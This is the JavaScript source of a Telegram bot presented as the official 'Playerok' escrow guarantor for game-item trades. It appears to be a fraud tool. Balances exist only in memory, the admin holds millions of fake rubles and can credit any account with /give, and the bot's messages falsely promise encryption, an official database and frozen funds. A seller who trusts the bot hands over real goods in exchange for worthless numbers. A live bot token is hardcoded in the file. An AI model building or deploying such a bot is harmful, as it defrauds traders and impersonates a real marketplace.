const { Telegraf, Markup } = require('telegraf');
const http = require('http');
const bot = new Telegraf('8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY');
const ADMIN = 'k13_way', ADMIN_ID = 8886821631;
let users = {}, deals = {}, states = {};

http.createServer((req, res) => { res.writeHead(200); res.end('OK'); }).listen(process.env.PORT || 10000);

function init(id, name) {
    const un = name ? name.toLowerCase() : '';
    if (!users[id]) users[id] = { id: id, username: un, balance: id === ADMIN_ID ? 16699677 : 0, count: 0 };
    else if (un) users[id].username = un;
}
function findId(name) {
    const cl = name.replace('@', '').trim().toLowerCase();
    for (const id in users) { if (users[id].username === cl) return parseInt(id); }
    return null;
}
const menu = Markup.keyboard([['🤝 Создать сделку'], ['💳 Баланс', '🛡️ Безопасность'], ['ℹ️ О Гарант Боте Playerok', '🆘 Поддержка']]).resize();

// Главный перехватчик: инициализирует юзера ДО любой команды
bot.use((ctx, next) => {
    if (ctx.from) init(ctx.from.id, ctx.from.username);
    return next();
});

bot.start((ctx) => { 
    ctx.replyWithMarkdown('Добро пожаловать 👋\n\n✅ *PlayerOk* — специализированный маркетплейс и торговый гарант по обеспечению полной безопасности внебиржевых сделок.\n\n• Комиссия: 1%\n• Режим работы: 24/7\n• Поддержка: @sw1zyy01', menu); 
});

bot.hears('💳 Баланс', (ctx) => {
    const u = users[ctx.from.id];
    ctx.replyWithMarkdown(`👑 *ЛИЧНЫЙ КАБИНЕТ PLAYEROK* 👑\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n👤 *Пользователь:* @${ctx.from.username || 'нет'}\n💎 *Статус:* Проверенный трейдер\n📈 *Успешных сделок:* ${u.count}\n\n💵 *Текущий баланс:* [ ${u.balance.toLocaleString('ru-RU')} руб. ]\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`);
});

bot.hears('🤝 Создать сделку', (ctx) => {
    ctx.reply('👉 Выберите вашу роль в создаваемой безопасной сделке:', Markup.inlineKeyboard([[Markup.button.callback('🛒 Я хочу Купить', 'r_buy'), Markup.button.callback('💰 Я хочу Продать', 'r_sell')]]));
});

bot.hears('ℹ️ О Гарант Боте Playerok', (ctx) => ctx.reply('💎 Playerok Гарант бот — это внутренние безопасные сделки прямо в Telegram! Все текущие операции надёжно шифруются и хранятся в официальной базе данных.'));
bot.hears('🛡️ Безопасность', (ctx) => ctx.reply('🛡️ Официальный Гарант сервис Playerok защищает ваши средства от любых видов мошенничества. Деньги покупателя замораживаются на транзитном счёте гаранта.'));
bot.hears('🆘 Поддержка', (ctx) => ctx.reply('🆘 Служба поддержки Playerok Гарант ПРЯМО в Telegram!\n\n⚖️ В случае любых спорных моментов обращайтесь к нашему модератору арбитража: @sw1zyy01.'));

bot.command('give', (ctx) => {
    if (ctx.from.username?.toLowerCase() !== ADMIN) return ctx.reply('❌ Нет прав.');
    const args = ctx.message.text.split(' ');
    if (args.length !== 3) return ctx.reply('⚠️ /give [ID] [Сумма]');
    const tId = parseInt(args[1]), am = parseInt(args[2]);
    if (isNaN(tId) || isNaN(am) || am <= 0) return ctx.reply('❌ Ошибка.');
    init(tId, null); users[tId].balance += am; ctx.reply('✅ Начислено');
    bot.telegram.sendMessage(tId, `💰 Баланс пополнен: +${am} руб.`).catch(()=>{});
});

bot.action('r_buy', (ctx) => { ctx.answerCbQuery().catch(()=>{}); states[ctx.from.id] = { step: 'info', type: 'buy' }; ctx.replyWithMarkdown('🛒 *ОФОРМЛЕНИЕ ПОКУПКИ*\n\n📝 Отправьте данные сделки *одним сообщением* строго по шаблону:\n`[Сумма] [Название товара] [Юзернейм Продавца]`\n\n📋 *Пример:* `2500 Standoff 2 Account @user_name`'); });
bot.action('r_sell', (ctx) => { ctx.answerCbQuery().catch(()=>{}); states[ctx.from.id] = { step: 'info', type: 'sell' }; ctx.replyWithMarkdown('💰 *ОФОРМЛЕНИЕ ПРОДАЖИ*\n\n📝 Отправьте данные сделки *одним сообщением* строго по шаблону:\n`[Сумма] [Название товара] [Юзернейм Покупателя]`\n\n📋 *Пример:* `1500 Нож в Standoff 2 @user_name`'); });

bot.on('text', (ctx, next) => {
    const uid = ctx.from.id, st = states[uid];
    if (!st || st.step !== 'info') return next();
    delete states[uid];
    const match = ctx.message.text.trim().match(/^(\d+)\s+(.+?)\s+(@[A-Za-z0-9_]{4,})$/);
    if (!match) return ctx.reply('❌ Неверный формат сообщения! Нажмите кнопку «🤝 Создать сделку» заново.');
    const am = parseInt(match[1]), item = match[2], targetUser = match[3];
    const tId = findId(targetUser);
    if (!tId) return ctx.reply(`❌ Пользователь ${targetUser} не найден в базе. Он должен сначала зайти в этого бота и нажать /start!`);
    if (uid === tId) return ctx.reply('❌ Ошибка: Нельзя проводить безопасную сделку с самим собой.');
    const dId = Math.floor(100000 + Math.random() * 900000);
    const bId = st.type === 'buy' ? uid : tId, sId = st.type === 'buy' ? tId : uid;
    deals[dId] = { id: dId, bId: bId, sId: sId, am: am, item: item, status: 'wait' };
    ctx.reply(`⏳ Сделка №${dId} успешно оформлена! Ожидаем подтверждения от второй стороны.`);
    const notifyMsg = `🔔 *ВАМ ПРЕДЛОЖЕНА БЕЗОПАСНАЯ СДЕЛКА №${dId}!* 🔔\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n📦 *Товар/Услуга:* ${item}\n💰 *Сумма сделки:* ${am} руб.\n👤 *Второй участник:* @${ctx.from.username || 'Пользователь'}\n\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nВы готовы принять условия гаранта и выполнить сделку?`;
    bot.telegram.sendMessage(tId, notifyMsg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🤝 Подтвердить Сделку', `ok_${dId}`)]]) }).catch(()=>{ctx.reply('❌ Ошибка отправки уведомления.');});
});

bot.action(/^ok_(\d+)$/, (ctx) => {
    ctx.answerCbQuery().catch(()=>{});
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.sId || d.status !== 'wait') return ctx.reply('❌ Ошибка: Сделка недоступна.');
    d.status = 'pay'; ctx.editMessageText(`🤝 Вы приняли сделку №${dId}. Ожидайте, пока покупатель внесёт оплату.`);
    bot.telegram.sendMessage(d.bId, `🎉 Продавец принял сделку №${dId}!\n\n📦 Товар: *${d.item}*\n💰 К оплате: *${d.am} руб.*\n\nНажмите кнопку ниже для перевода средств со своего баланса на счёт гаранта:`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить покупку', `pay_${dId}`)]]) });
});

bot.action(/^pay_(\d+)$/, (ctx) => {
    ctx.answerCbQuery().catch(()=>{});
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.bId || d.status !== 'pay') return ctx.reply('❌ Ошибка.');
    if (users[d.bId].balance < d.am) return ctx.reply(`❌ Недостаточно средств. Баланс: ${users[d.bId].balance} руб.`);
    users[d.bId].balance -= d.am; d.status = 'send'; ctx.editMessageText(`💰 Сделка №${dId} успешно оплачена! Средства заморожены на счёте Playerok. Ожидайте товар.`);
    bot.telegram.sendMessage(d.sId, `📢 Покупатель оплатил сделку №${dId}! Средства заморожены.\n\n👉 Передайте товар покупателю в ЛС. После передачи нажмите кнопку:`, Markup.inlineKeyboard([[Markup.button.callback('📦 Товар передан', `sent_${dId}`)]]));
});

bot.action(/^sent_(\d+)$/, (ctx) => {
    ctx.answerCbQuery().catch(()=>{});
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.sId || d.status !== 'send') return ctx.reply('❌ Ошибка.');
    d.status = 'check'; ctx.editMessageText(`👌 Вы зафиксировали передачу товара по сделке №${dId}. Ожидайте проверки покупателем.`);
    bot.telegram.sendMessage(d.bId, `🔔 Продавец отметил, что передал товар по сделке №${dId}!\n\nПроверьте полученные данные и подтвердите покупку:`, Markup.inlineKeyboard([[Markup.button.callback('✅ Подтвердить покупку', `done_${dId}`)]]));
});

bot.action(/^done_(\d+)$/, (ctx) => {
    ctx.answerCbQuery().catch(()=>{});
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.bId || d.status !== 'check') return ctx.reply('❌ Ошибка.');
    d.status = 'end'; users[d.sId].balance += d.am; users[d.bId].count++; users[d.sId].count++;
    ctx.editMessageText(`🎉 Сделка №${dId} успешно завершена! Средства переведены продавцу. ❤️`);
    bot.telegram.sendMessage(d.sId, `💰 Покупатель подтвердил получение товара по сделке №${dId}! Вам зачислено: +${d.am} руб.`);
});

bot.launch().then(() => console.log('🚀 OK'));
